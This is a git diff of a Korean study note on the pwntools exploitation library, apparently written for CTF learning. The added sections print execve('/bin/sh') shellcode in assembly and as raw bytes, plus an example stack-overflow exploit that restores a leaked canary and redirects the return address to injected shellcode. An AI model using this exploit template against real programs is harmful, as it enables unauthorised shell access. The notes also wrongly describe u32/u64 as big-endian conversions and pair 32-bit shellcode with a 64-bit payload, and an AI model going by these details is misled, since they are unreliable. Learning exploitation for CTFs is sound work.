@@ -48,7 +48,12 @@ $ python3 -m pip install --upgrade pwntools
      - `result = target.recvuntil(A)`: A 문자를 만날 때 까지 데이터 수신
      - `result = target.recvall()`: 프로세스가 종료될 때 까지 데이터 수신
 4. packing / unpacking
-   - 리틀엔디안 / 빅엔디안 사이를 변환하는 함수
+   - 데이터를 변환하는 함수
+   - `p32(VALUE)` : 32bit little endian으로 변환
+   - `p64(VALUE)` : 64bit little endian으로 변환
+   - `u32(VALUE)` : 32bit big endian으로 변환
+   - `u64(VALUE)` : 64bit big endian으로 변환
+
 5. interactive
    - exploint 중 표준 입력/출력으로 프로세스에 직접 입력을 주입하고 출력을 확인하고 싶은 경우
    - `target.interactive()` 를 설정하면 'target' 에 직접 관여할 수 있다.
@@ -62,10 +67,74 @@ $ python3 -m pip install --upgrade pwntools
    - context.arch
      - exploit 대상의 아키텍처에 대한 정보를 설정할 수 있다. 
      - `context.arch = "amd64"` 형태로 설정
-     - i386, arm, mips 등을 설정 할 수 있다.
+     - `i386`, `arm`, `mips` 등을 설정 할 수 있다.
 8. asm
    - `asm(CODE)` 형태로 CODE에 어셈블리 라인을 string 형태로 기입시 바이너리 코드를 반환한다.
    - ex) `asm('mov eax, SYS_execve')` => `b'\xb8\x0b\x00\x00\x00'`
 9. disasm
    - `disasm(BIN)` 형태로 BIN에 바이너리 데이터를 입력시 어셈블리 명령어를 반환한다. 
    - ex) `disasm(b'\xb8\x0b\x00\x00\x00')` => `0:   b8 0b 00 00 00          mov    eax, 0xb'`
+
+## checksec
+- pwntool과 함께 설치되는 도구로, 바이너리에 적용되는 보호 기법(ex: RELRO, Canary, NX, PIE) 을 확인할 수 있다.
+- ex)
+   ```
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+   ```
+
+
+## shellcraft
+- pwntool과 함께 설치되는 파이썬 모듈로 쉘 코드의 함수들을 반환한다.
+  - shellcraft.sh() : 쉘 실행 코드
+  - shellcraft.open() : 쉘 코드 open(인자 필요)
+  - shellcraft.read() : 쉘 코드 read(인자 필요)
+  - shellcraft.write() : 쉘 코드 write(인자 필요)
+  - shellcraft.exit() : 쉘 코드 exit
+- asm() 함수와 함께 조합하면 쉘코드를 바이너리로 만들어 프로그램에 주입할 수 있다.
+  - ex) shellcraft.sh() : 
+      ```
+      /* execve(path='/bin///sh', argv=['sh'], envp=0) */
+      /* push b'/bin///sh\x00' */
+      push 0x68
+      push 0x732f2f2f
+      push 0x6e69622f
+      mov ebx, esp
+      /* push argument array ['sh\x00'] */
+      /* push 'sh\x00\x00' */
+      push 0x1010101
+      xor dword ptr [esp], 0x1016972
+      xor ecx, ecx
+      push ecx /* null terminate */
+      push 4
+      pop ecx
+      add ecx, esp
+      push ecx /* 'sh\x00' */
+      mov ecx, esp
+      xor edx, edx
+      /* call execve() */
+      push SYS_execve /* 0xb */
+      pop eax
+      int 0x80
+      ```
+  - ex) asm(shellcraft.sh()) : `b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'`
+
+
+## 예시
+1. stack frame안의 버퍼와 canary를 획득한 경우, 버퍼에 shell 실행 코드를 주입하고 stack overflow로 return code를 버퍼의 주소로 변경한 후 canary를 복원시키면 쉘을 획득할 수 있다.
+
+   ```
+   from pwn import *
+   target = process(TARGET_PROGRAM)
+   # 'canary' 는 추출해온 스택 카나리 값이 littel endian형태로 담겨있다.
+   shell_code = asm(shellcraft.sh())  # pwn tool로 쉘 실행코드 생성 및 바이너리로 변환
+   payload = shell_code.ljust(buffer_to_canary, b'A') + canary + b'B' * 0x8 + p64(buffer_address) # 버퍼에 쉘 코드를 넣고, 남는 칸은 아무 문자로 메꾼다. 그 후 카나리를 잘 복원하고 SFP는 아무 숫자나 채워넣고 리턴 주소를 버퍼 주소로 덮어씀
+   # gets() receives input until '\n' is received
+   target.sendlineafter(b'Input:', payload) # 타겟 프로그램에서 Input을 받아 'buffer_address' 주소에 받도록 프로그램이 짜여져 있다.
+
+   target.interactive() # 쉘을 획득하고 쉘을 유저가 활용할 수 있게 반환한다.
+   ```
